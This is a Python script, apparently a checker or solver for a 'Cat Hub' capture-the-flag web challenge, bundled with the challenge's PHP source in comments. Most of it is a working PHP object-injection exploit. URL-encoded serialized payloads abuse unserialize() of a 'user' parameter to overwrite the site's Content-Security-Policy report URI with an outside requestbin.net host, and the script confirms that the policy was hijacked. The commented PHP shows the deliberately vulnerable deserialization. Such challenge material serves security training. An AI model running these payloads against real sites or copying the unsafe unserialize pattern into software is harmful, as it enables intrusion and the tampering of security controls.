from requests import *
import urllib
from bs4 import BeautifulSoup as bs
# $a = new UserData();
# $a->token_string = [new CatWithHashGet(), "aaaa"];
# $a->token_string[0]->user_object = new UserData();
# $a->token_string[0]->csp_object = new \ShouFramework\CSP();
# $a->token_string[0]->csp_object->report_uri_string = "http://requestbin.net/r/4ahwmg2x";
#
# echo serialize($a);



obj1 = "O%3A8%3A%22UserData%22%3A1%3A%7Bs%3A12%3A%22token_string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A14%3A%22CatWithHashGet%22%3A3%3A%7Bs%3A11%3A%22user_object%22%3BO%3A8%3A%22UserData%22%3A1%3A%7Bs%3A12%3A%22token_string%22%3Bs%3A23%3A%2260cac64499b780.91919469%22%3B%7Ds%3A10%3A%22csp_object%22%3BO%3A17%3A%22ShouFramework%5CCSP%22%3A1%3A%7Bs%3A17%3A%22report_uri_string%22%3Bs%3A32%3A%22http%3A//requestbin.net/r/4j59v5y4%22%3B%7Ds%3A15%3A%22template_object%22%3BO%3A22%3A%22ShouFramework%5CTemplate%22%3A0%3A%7B%7D%7Di%3A1%3Bs%3A4%3A%22aaaa%22%3B%7D%7D"
obj2 = "O%3A8%3A%22UserData%22%3A1%3A%7Bs%3A12%3A%22token_string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A14%3A%22CatWithHashGet%22%3A3%3A%7Bs%3A11%3A%22user_object%22%3BO%3A8%3A%22UserData%22%3A1%3A%7Bs%3A12%3A%22token_string%22%3Bs%3A23%3A%2260cac64499b780.91919469%22%3B%7Ds%3A10%3A%22csp_object%22%3BO%3A17%3A%22ShouFramework%5CCSP%22%3A1%3A%7Bs%3A17%3A%22report_uri_string%22%3Bs%3A32%3A%22http%3A//requestbin.net/r/4j59v5y4%22%3B%7Ds%3A15%3A%22template_object%22%3BO%3A22%3A%22ShouFramework%5CTemplate%22%3A0%3A%7B%7D%7Di%3A0%3Bs%3A4%3A%22aaaa%22%3B%7D%7D"
def check(host):
    resp = get(f"http://{host}/")
    if b'Cat Hub' not in resp.content:
        return 0, "Cannot load"
    resp = post(f"http://{host}/?method=post", data={
        "content": "wectflol"
    })
    if b'Your post is saved at' not in resp.content:
        return 0, "Cannot post"
    
    url = resp.content.split(b"<a href='")[1].split(b"'>")[0].decode("utf-8")
    resp = get(f"http://{host}/{url}")
    if b'wectflol' not in resp.content:
        return 0, "Bad post saved"
    
    resp = get(f"http://{host}/{url + '&user=' + obj1}")
    if b"<head>" in resp.content:
        return 0, "Not dead imm"

    resp = get(f"http://{host}/{url + '&user=' + obj2}")
    if b"<head>" not in resp.content:
        return 0, "Dead imm"

    if "http://requestbin.net/r/4j59v5y4;" not in resp.headers.get("Content-Security-Policy"):
        return 0, "CSP not pwned"

    

    return 1, ""

if __name__ == "__main__":
    print(check("172.17.0.2"))


# <?php
#
#
# require_once "framework/HTTP.module";
# require_once "framework/Typed.module";
# require_once "framework/CSP.module";
#
#
# // Model
# class CatData extends \ShouFramework\Typed {
#     public $hash_string;
#     public $time_integer;
#     public $content_string;
#
#     protected function construct(){}
#
#     protected function destruct(){}
# }
#
# class UserData extends \ShouFramework\Typed {
#     public $token_string;
#
#     protected function construct() {
#         if (isset($_GET["user"])) {
#             $user = unserialize($_GET["user"]);
#             echo $_GET["user"];
#             if (get_class($user) != "UserData") \ShouFramework\shutdown();
#             $this->token_string = $user->token_string;
#         }
#         // unauthenticated request
#         $this->token_string = uniqid("", true);
#         return $this;
#     }
#     protected function destruct(){}
# }
#
#
# // Controllers
# class CatGet extends \ShouFramework\HTTP{
#     public function render(){
#         $this->template_object->render_html("
# <h1>Cat Hub</h1>
# <form action='/?method=post' method='post'>
#     Upload your cat porn articles!
#     <br>
#     <textarea name='content'></textarea>
#     <input type='submit'>
# </form>
#         ");
#     }
# }
#
# class CatPost extends \ShouFramework\HTTP{
#     public UserData $user_object;
#
#     public function construct() {
#         parent::construct();
#         $this->user_object = new UserData();
#     }
#
#     public function handle(){
#         $content = $_POST["content"];
#         $time = time();
#         $hash = sha1($this->user_object->token_string . $content . "$time");
#         $hashhash = sha1($hash);
#         $cat_post = new CatData();
#         $cat_post->hash_string = $hash;
#         $cat_post->time_integer = $time;
#         $cat_post->content_string = $content;
#         $cat_dump = fopen("tmp/$hashhash", "w+");
#         fwrite($cat_dump, serialize($cat_post));
#         fclose($cat_dump);
#         $this->template_object->render_html("
# <h1>Cat Hub</h1>
# Your post is saved at: <a href='/?method=show&hash=$hash'>/?method=show&hash=$hash</a>
#         ");
#     }
#     public function render(){}
# }
#
# class CatWithHashGet extends \ShouFramework\HTTP{
#     public UserData $user_object;
#     public \ShouFramework\CSP $csp_object;
#
#     public function construct() {
#         parent::construct();
#         $this->user_object = new UserData();
#         $this->csp_object = new \ShouFramework\CSP();
#     }
#
#     public function render() {
#         $hash = $_GET["hash"];
#         $hashhash = sha1($_GET["hash"]);
#         $filename = "tmp/$hashhash";
#         if (!file_exists($filename)) {
#             $this->template_object->render_html("Not found");
#             return;
#         }
#         $cat_dump = fopen($filename, "r");
#         $cat_info = unserialize(fread($cat_dump,filesize($filename)));
#         $nonce = $this->csp_object->generate_nonce();
#         $this->csp_object->add_csp([$nonce]);
#         $this->template_object->render_html("<head></head>");
#         $this->template_object->render_script("
# function add_js(filename, nonce) {
#   var head = document.head;
#   var script = document.createElement('script');
#   script.nonce = nonce;
#   script.src = filename;
#   head.appendChild(script);
# }
# window.onhashchange = () => {let query = window.location.hash.substr(1).split('@'); add_js(query[0], query[1])};
#         ", $nonce);
#         $this->template_object->render_html("
# <h1>Cat Hub</h1>
# <p id='time'></p>
# <p>$cat_info->content_string</p>
# <p>Permalink: <a>/?method=show&hash=$hash</a></p>
#
# <a href='#black.js@$nonce'>Black Background</a>
# <a href='#white.js@$nonce'>White Background</a>
#         ");
#         $this->template_object->render_script("
# time.innerText = new Date($cat_info->time_integer)
#         ", $nonce);
#     }
# }
# $a = new UserData();
# $a->token_string = [new CatWithHashGet(), "aaaa"];
# $a->token_string[0]->user_object = new UserData();
# $a->token_string[0]->csp_object = new \ShouFramework\CSP();
# $a->token_string[0]->csp_object->report_uri_string = "http://requestbin.net/r/4j59v5y4";
#
# echo serialize($a);
#
